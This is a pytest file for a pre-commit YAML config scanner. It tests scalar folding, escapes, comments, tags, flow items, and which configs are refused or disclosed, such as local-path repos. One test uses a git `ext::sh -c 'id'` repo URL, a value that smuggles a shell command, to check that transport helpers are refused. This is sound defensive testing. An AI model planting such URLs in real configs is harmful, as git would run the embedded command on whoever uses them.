def test_a_mapping_where_pre_commit_wants_text_refuses_the_config():
    """`types_or: [markdown, file: text]` holds a flow mapping as its second
    item, and `files: a: b` is a mapping value where YAML allows none; neither
    file loads, and read as the text `file: text` the first left `markdown`
    standing as a certain match. Quoted, `: ` is two characters like any."""
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    for line in (
        "types_or: [markdown, file: text]",
        "files: a: b",
        "stages: [manual, x:]",
        "files: ^(?x: a)",
    ):
        with pytest.raises(C.ConfigRefused, match=r"is a mapping to YAML.*line 5"):
            C.scan(head + f"        {line}\n")
    cfg = C.scan(head + "        files: 'a: b'\n        types_or: [markdown, \"file: text\"]\n")
    assert cfg.repos[0].hooks[0].settings["files"] == "a: b"
    assert C.flow_items(cfg.repos[0].hooks[0].settings["types_or"]) == ["markdown", "file: text"]


def test_flow_items_are_trimmed_of_line_breaks_and_refuse_a_bracket_inside_a_plain_item():
    """A blank line between flow items -- `[manual,` over a blank line over
    `pre-commit]` -- folds to a newline inside the value, and the item came
    back as `\\npre-commit`, a stage no hook runs on. Between items a break is
    white space. And `[markdown, foo[bar]` holds a flow indicator inside a
    plain item, which YAML rejects; split on commas alone it read as two tags,
    one of them valid."""
    cfg = C.scan("default_stages: [manual,\n\n  pre-commit]\nrepos: []\n")
    assert C.flow_items(C.top_level_sequence(cfg, "default_stages") or "") == [
        "manual",
        "pre-commit",
    ]
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    for value in ("[markdown, foo[bar]", "[a, b]c]", "[a, {b}]", "[markdown, |]", "[>-, a]"):
        with pytest.raises(C.ConfigRefused, match="line 5"):
            C.scan(head + f"        types_or: {value}\n")
    cfg = C.scan(head + "        types_or: [markdown, 'foo[bar']\n")
    assert C.flow_items(cfg.repos[0].hooks[0].settings["types_or"]) == ["markdown", "foo[bar"]


def test_a_comment_line_ends_a_plain_scalar_and_more_content_after_it_refuses():
    """`files: README` over an indented `# why` over `.*md$`: a comment line
    ends a plain scalar that has started, and YAML stops at the content that
    follows. Folded on, the value read as `README .*md$`, a pattern in a
    config that does not load. A comment before the value starts, or between
    the items of a flow sequence, is nothing at all; and a `#` line inside a
    quoted scalar is content."""
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    with pytest.raises(C.ConfigRefused, match=r"comment line ended.*line 5"):
        C.scan(head + "        files: README\n          # why\n          .*md$\n")
    with pytest.raises(C.ConfigRefused, match=r"comment line ended.*line 1"):
        C.scan("files: README\n  # why\n  .*md$\nrepos: []\n")
    # The comment alone, with the next key after it, simply ends the value.
    cfg = C.scan(head + "        files: README\n          # why\n        stages: [manual]\n")
    assert cfg.repos[0].hooks[0].settings == {"files": "README", "stages": "[manual]"}
    cfg = C.scan(head + "        files:\n          # the value follows\n          ^src/\n")
    assert cfg.repos[0].hooks[0].settings["files"] == "^src/"
    cfg = C.scan(head + "        stages: [manual,\n          # and\n          pre-push]\n")
    assert C.flow_items(cfg.repos[0].hooks[0].settings["stages"]) == ["manual", "pre-push"]
    cfg = C.scan(head + '        files: "a\n          # not a comment\n          b"\n')
    assert cfg.repos[0].hooks[0].settings["files"] == "a # not a comment b"


def test_type_filters_are_captured_like_every_other_gate():
    """pre-commit applies them on top of `files:`/`exclude:`, so a scope verdict
    that never saw them called a `types: [python]` Markdown hook live."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        "        types: [python]\n        types_or:\n          - yaml\n          - toml\n"
        "        exclude_types: [markdown]\n"
    )
    settings = cfg.repos[0].hooks[0].settings
    assert C.flow_items(settings["types"]) == ["python"]
    assert C.flow_items(settings["types_or"]) == ["yaml", "toml"]
    assert C.flow_items(settings["exclude_types"]) == ["markdown"]


def test_double_quoted_scalars_resolve_their_escapes_and_single_quoted_do_not():
    """`files: "\\\\.md$"` is the regex `\\.md$` to YAML and to pre-commit.
    Reading the two backslashes as written compiled a regex for a literal
    backslash and called a live hook dead. Single quotes have no escapes, so
    `'\\\\.md$'` really is two backslashes -- to YAML, to pre-commit, and here."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n"
        '      - id: a\n        entry: x\n        language: system\n        files: "\\\\.md$"\n'
        "      - id: b\n        entry: x\n        language: system\n        files: '\\\\.md$'\n"
        '      - id: c\n        entry: x\n        language: system\n        files: "a\\tb\\u00e9\\"q\\""\n'
    )
    a, b, c = cfg.repos[0].hooks
    assert a.settings["files"] == "\\.md$"
    assert b.settings["files"] == "\\\\.md$"
    assert c.settings["files"] == 'a\tb\u00e9"q"'


def test_top_level_sequence_reads_flow_and_block_forms_alike():
    """`default_stages:` decides whether a hook without its own `stages:` runs
    on commit, and the block form is the everyday way to write it."""
    flow = C.scan("default_stages: [manual, pre-push]\nrepos: []\n")
    assert C.top_level_sequence(flow, "default_stages") == "[manual, pre-push]"
    block = C.scan("default_stages:\n  - manual\n  - pre-push\nrepos: []\n")
    assert C.top_level_sequence(block, "default_stages") == "[manual, pre-push]"
    assert C.top_level_sequence(flow, "fail_fast") is None
    # A same-column block sequence at the top level is refused by scan() itself
    # ("top-level line is not a `key: value` mapping entry"), so there is no
    # config in which this reader would meet one.


def test_a_hook_level_value_continued_onto_the_next_line_is_read_the_same_way():
    """`files:` over an indented `^docs/` inside a hook was stored as "" -- and
    "" compiles to a pattern that matches every path. The hook's gating keys
    now read the way a top-level key does; a block sequence is still a block
    sequence, and a sibling key ends the value."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n"
        "      - id: a\n        entry: x\n        language: system\n"
        "        files:\n          ^docs/\n"
        "        exclude: |-\n          ^never/\n"
        "        stages:\n          - manual\n"
        "      - id: b\n        entry: x\n        language: system\n"
        "        files: ^src/\n          a\\.py$\n"
    )
    a, b = cfg.repos[0].hooks
    assert a.settings["files"] == "^docs/"
    assert a.settings["exclude"] == "|-"
    assert a.settings["stages"] == "[manual]"
    assert b.settings["files"] == "^src/ a\\.py$"


def test_a_top_level_value_continued_onto_the_next_line_is_read_and_folded():
    """`files:\n  ^src/` and `default_stages:\n  [manual]` are ordinary YAML.
    Read from the key's own line only, both came back empty -- a config-wide
    filter silently dropped from every hook's scope, a stage default read as
    unset -- and YAML's own rule for the continued lines of a plain or flow
    scalar is to fold them with single spaces."""
    cfg = C.scan(
        "files:\n  ^src/\nexclude:\n  # a comment between\n  ^vendor/\n"
        "default_stages:\n  [manual,\n   pre-push]\nrepos: []\n"
    )
    assert C.top_level_scalar(cfg, "files") == "^src/"
    assert C.top_level_scalar(cfg, "exclude") == "^vendor/"
    assert C.top_level_sequence(cfg, "default_stages") == "[manual, pre-push]"
    commented = C.scan("default_stages:\n  [manual, # why\n   pre-push]  # and why\nrepos: []\n")
    assert C.top_level_sequence(commented, "default_stages") == "[manual, pre-push]"
    tabbed = C.scan("default_stages:\n  [manual,\t# why\n   pre-push]\nrepos: []\n")
    assert C.top_level_sequence(tabbed, "default_stages") == "[manual, pre-push]"
    # A blank line inside a continued plain scalar folds to a newline, as YAML
    # has it -- so the regex pre-commit compiles is the one read here.
    broken = C.scan("files:\n  ^docs/\n\n  a\\.md$\nrepos: []\n")
    assert C.top_level_scalar(broken, "files") == "^docs/\na\\.md$"
    # A block-scalar indicator continued onto the next line is handed back as
    # the indicator, the same "pattern not read" as `files: |` on the key's line.
    indicator = C.scan("files:\n  |\n    ^docs/\nrepos: []\n")
    assert C.top_level_scalar(indicator, "files") == "|"
    # A backslash ending a line inside a double-quoted value escapes the break:
    # the two lines join with nothing between, and the backslash goes.
    escaped = C.scan('files:\n  "^docs/\\\n   .*\\\\.md$"\nrepos: []\n')
    assert C.top_level_scalar(escaped, "files") == "^docs/.*\\.md$"
    # In single quotes a backslash is a character like any other, and the break
    # folds to a space.
    literal = C.scan("files:\n  '^docs/\\\n   .*\\\\.md$'\nrepos: []\n")
    assert C.top_level_scalar(literal, "files") == "^docs/\\ .*\\\\.md$"
    # An indicator on the key's line stays the indicator, whatever follows it.
    on_key = C.scan("files: |-\n  ^docs/\nrepos: []\n")
    assert C.top_level_scalar(on_key, "files") == "|-"
    # YAML's white space is space and tab; a U+00A0 at the end of a plain
    # scalar is content, inline or continued, and stays in the pattern.
    nbsp = C.scan("files: ^a\u00a0\nexclude:\n  ^b\u00a0\nrepos: []\n")
    assert C.top_level_scalar(nbsp, "files") == "^a\u00a0"
    assert C.top_level_scalar(nbsp, "exclude") == "^b\u00a0"
    # And only a space or a tab before `#` opens a comment: `README\u00a0#missing`
    # is one value, to YAML and to pre-commit.
    hashed = C.scan("files: README\u00a0#missing\nrepos: []\n")
    assert C.top_level_scalar(hashed, "files") == "README\u00a0#missing"
    # A continued line holding only a U+00A0 is content, not a blank line.
    nbsp_line = C.scan("files:\n  ^README$\n  \u00a0\nrepos: []\n")
    assert C.top_level_scalar(nbsp_line, "files") == "^README$ \u00a0"
    # An escaped space at the end of a double-quoted line is content, and the
    # break still folds to a space: two spaces, as YAML has it.
    escaped_space = C.scan('files:\n  "^README\\ \n   [.]md$"\nrepos: []\n')
    assert C.top_level_scalar(escaped_space, "files") == "^README  [.]md$"
    # The same escape at the end of the KEY's line, where the value starts.
    # Trimmed with the line's white space, the lone backslash read as escaping
    # the break, and the two lines joined with nothing between.
    on_key = C.scan('files: "^README\\ \n  [.]md$"\nrepos: []\n')
    assert C.top_level_scalar(on_key, "files") == "^README  [.]md$"
    in_hook = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        '        files: "^README\\ \n          [.]md$"\n'
    )
    assert in_hook.repos[0].hooks[0].settings["files"] == "^README  [.]md$"
    as_item = C.scan('default_stages:\n  - "pre-\\ \n    commit"\nrepos: []\n')
    assert C.top_level_sequence(as_item, "default_stages") == "[pre-  commit]"
    # A tab before `#` opens a comment in a block item too.
    tab_item = C.scan("default_stages:\n  - pre-commit\t# ordinary\nrepos: []\n")
    assert C.top_level_sequence(tab_item, "default_stages") == "[pre-commit]"
    # An escaped break inside a quoted ITEM -- of a flow sequence, or of a
    # block sequence -- joins the same way, and an apostrophe in a plain word
    # opens no quote.
    flow_break = C.scan('default_stages: ["pre-\\\n  commit"]\nrepos: []\n')
    assert C.top_level_sequence(flow_break, "default_stages") == '["pre-commit"]'
    assert C.flow_items(C.top_level_sequence(flow_break, "default_stages") or "") == ["pre-commit"]
    block_break = C.scan('default_stages:\n  - "pre-\\\n    commit"\n  - manual\nrepos: []\n')
    assert C.top_level_sequence(block_break, "default_stages") == "[pre-commit, manual]"
    plain = C.scan("files: don't\n  care\nrepos: []\n")
    assert C.top_level_scalar(plain, "files") == "don't care"
    # A quote this reader cannot see closed refuses the config at scan time,
    # with its line, as pre-commit's own loader would. Read as "not set" it
    # left every hook judged as if the stage default had never been written.
    with pytest.raises(C.ConfigRefused, match=r"never closed.*line 1"):
        C.scan('default_stages:\n  - "pre-\nrepos: []\n')
    # A tag says what the value is, not what it says, and comes off first.
    tagged = C.scan("files: !!str '^README[.]md$'\nexclude: !!str ^vendor/\nrepos: []\n")
    assert C.top_level_scalar(tagged, "files") == "^README[.]md$"
    assert C.top_level_scalar(tagged, "exclude") == "^vendor/"
    # A tag with nothing after it is the empty string -- `exclude: ''`, the
    # pattern that matches every path -- not the text `!!str`, which matches
    # none. The value may also follow on the next line.
    valueless = C.scan("exclude: !!str\nrepos: []\n")
    assert C.top_level_scalar(valueless, "exclude") == ""
    below = C.scan("exclude: !!str\n  ^vendor/\nrepos: []\n")
    assert C.top_level_scalar(below, "exclude") == "^vendor/"
    hook = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        exclude: !!str\n")
    assert hook.repos[0].hooks[0].settings["exclude"] == ""
    # Only `!!str` is text. `!!int 123` is a number pre-commit rejects where it
    # wants a regex, and a local tag is one its loader does not know: neither
    # file loads, and neither value is read here as a pattern.
    with pytest.raises(C.ConfigRefused, match=r"tag `!!int`.*line 5"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        files: !!int 123\n")
    with pytest.raises(C.ConfigRefused, match=r"tag `!mine`.*line 1"):
        C.scan("exclude: !mine ^vendor/\nrepos: []\n")
    # A tag in front of a block-scalar indicator leaves it the indicator.
    tagged_block = C.scan("files: !!str |-\n  ^docs/\nrepos: []\n")
    assert C.top_level_scalar(tagged_block, "files") == "|-"
    tagged_below = C.scan("files:\n  !!str |\n    ^docs/\nrepos: []\n")
    assert C.top_level_scalar(tagged_below, "files") == "|"
    # A plain scalar may start on the key's line and continue below it.
    prefixed = C.scan(
        "files: ^docs/\n  a\\.md$\ndefault_stages: [manual,\n  pre-push]\nrepos: []\n"
    )
    assert C.top_level_scalar(prefixed, "files") == "^docs/ a\\.md$"
    assert C.top_level_sequence(prefixed, "default_stages") == "[manual, pre-push]"
    block = C.scan("default_stages:\n  - manual\nrepos: []\n")
    assert C.top_level_sequence(block, "default_stages") == "[manual]"
    assert C.top_level_scalar(cfg, "fail_fast") is None


def test_top_level_scalar_is_public():
    """precommit.py was reaching through _split_key + _scalar, twice."""
    cfg = C.scan("exclude: '^vendor/'\nrepos:\n  - repo: https://x/y\n    hooks:\n      - id: a\n")
    assert C.top_level_scalar(cfg, "exclude") == "^vendor/"  # unquoted, like every scalar
    assert C.top_level_scalar(cfg, "fail_fast") is None


def test_a_local_path_repo_is_disclosed_rather_than_refused():
    """A bare path and a file:// URL are legitimate -- monorepos do this -- so
    neither is refused. But neither is a named remote either: what pre-commit
    clones comes off this disk, and it used to be carried across in total
    silence while the ext:: shape next door is announced."""
    cfg = C.scan(
        "repos:\n"
        "  - repo: file:///tmp/hooks\n    rev: v1\n    hooks:\n      - id: a\n"
        "  - repo: ../sibling-hooks\n    rev: v1\n    hooks:\n      - id: b\n"
        "  - repo: https://github.com/psf/black\n    rev: v1\n    hooks:\n      - id: c\n"
        "  - repo: local\n    hooks:\n      - id: d\n        name: d\n"
        "        entry: ./x.sh\n        language: script\n"
    )
    assert C.local_repo_sources(cfg) == ["../sibling-hooks", "file:///tmp/hooks"]


def test_a_transport_helper_is_still_refused_outright():
    """Disclosure is for what cannot be adjudicated; `ext::` names a program."""
    with pytest.raises(C.ConfigRefused, match="transport helper"):
        C.scan("repos:\n  - repo: ext::sh -c 'id'\n    hooks:\n      - id: a\n")


# -- the scanner's edges -------------------------------------------------------
#
# Line-by-line parsing lives or dies on these. Each one is a shape a real config
# can have, and a scanner that mis-reads one either refuses a file it should
# accept or -- worse -- accepts a file it has misunderstood.


def test_a_colon_inside_a_quoted_key_does_not_split_the_line():
    """A quoted key is legal YAML and may contain a colon. Splitting on that
    colon would invent a key out of half a quoted string -- and the halves are
    then compared against the gating names."""
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        'weird: key': v\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]
    # Kept whole, so no gating key is invented out of the halves.
    assert "weird" not in cfg.repos[0].hooks[0].settings


def test_a_quote_that_is_never_closed_is_refused():
    with pytest.raises(C.ConfigRefused, match="never closed"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        'oops: x\n")


def test_a_line_whose_only_colon_has_no_space_after_it_is_not_a_key():
    """`a:b` is a plain scalar. Reading it as a mapping entry would invent a
    key nobody wrote."""
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n    notakey:value\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_line_that_is_all_comment_after_some_text_yields_no_key():
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n    plain # note\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_trailing_comment_on_a_sequence_item_is_not_part_of_it():
    """_scalar sees the raw item here: _split_key never runs on a `- x` line."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages:\n"
        "          - manual # only by hand\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual]"


def test_a_merge_key_is_refused_even_with_no_anchor_in_sight():
    """The anchor check fires first on the usual `<<: *base`, so the merge-key
    branch needs a merge key with no alias to be reached at all."""
    with pytest.raises(C.ConfigRefused, match="merge key"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        <<: plain\n")


def test_a_top_level_key_after_repos_ends_the_block():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        "default_language_version:\n  python: python3.11\n"
    )
    assert [e.url for e in cfg.repos] == ["local"]
    assert "default_language_version" in cfg.top_keys


def test_blank_lines_and_comments_inside_an_entry_are_carried_not_read():
    cfg = C.scan(
        "repos:\n  - repo: https://x/y\n\n    # why this one\n    rev: v1\n"
        "    hooks:\n\n      # and this hook\n      - id: a\n"
    )
    assert cfg.repos[0].rev == "v1"
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_deeper_line_inside_an_entry_is_carried_not_read():
    """Anything more indented than the entry's keys belongs to a value this
    scanner does not interpret -- it is preserved, not parsed."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        name: a\n"
        "        additional_dependencies:\n          - some-package==1.0\n"
    )
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_blank_line_inside_a_block_sequence_does_not_end_it():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages:\n"
        "          - manual\n\n          - push\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual, push]"


def test_a_dedent_ends_a_block_sequence():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages:\n"
        "          - manual\n      - id: b\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual]"
    assert [h.id for h in cfg.repos[0].hooks] == ["a", "b"]


def test_flow_items_read_each_item_as_the_scalar_it_is():
    """`["pre\\u002dcommit"]` is `pre-commit` to YAML; stripping quotes alone
    left the escape in place, and a stage no hook runs on."""
    assert C.flow_items("[\"pre\\u002dcommit\", 'manual', plain]") == [
        "pre-commit",
        "manual",
        "plain",
    ]
    assert C.flow_items("[manual, pre-push]") == ["manual", "pre-push"]
    assert C.flow_items('["a,b", c]') == ["a,b", "c"]
    assert C.flow_items("[]") == []
